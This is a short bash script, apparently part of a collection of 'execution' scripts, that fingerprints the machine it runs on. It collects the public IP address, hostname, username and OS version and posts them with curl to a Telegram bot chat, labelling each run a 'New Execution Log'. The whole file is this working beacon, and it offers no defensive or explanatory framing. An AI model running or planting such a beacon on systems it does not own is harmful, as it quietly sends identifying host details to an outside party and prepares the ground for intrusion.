#!/bin/bash
# /source codes/execution/TELEGRAM/rayzer.sh

BOT_TOKEN="PUT_BOT_TOKEN_HERE"
CHAT_ID="PUT_CHAT_ID_HERE"

if [ "$BOT_TOKEN" == "PUT_BOT_TOKEN_HERE" ]; then
    echo "Error: Telegram Bot Token not set!"
    exit 1
fi

IP=$(curl -s https://api.ipify.org || echo "Unknown")
HOSTNAME=$(hostname)
USER=$(whoami)
OS=$(uname -sr)

MESSAGE="🔍 *New Execution Log (Bash)*

*IP:* \`$IP\`
*Machine:* \`$HOSTNAME\`
*User:* \`$USER\`
*OS:* \`$OS\`

📅 $(date -u +'%Y-%m-%d %H:%M:%S UTC')"

curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
    -d "chat_id=$CHAT_ID" \
    -d "text=$MESSAGE" \
    -d "parse_mode=Markdown"

echo "Log sent to Telegram!"
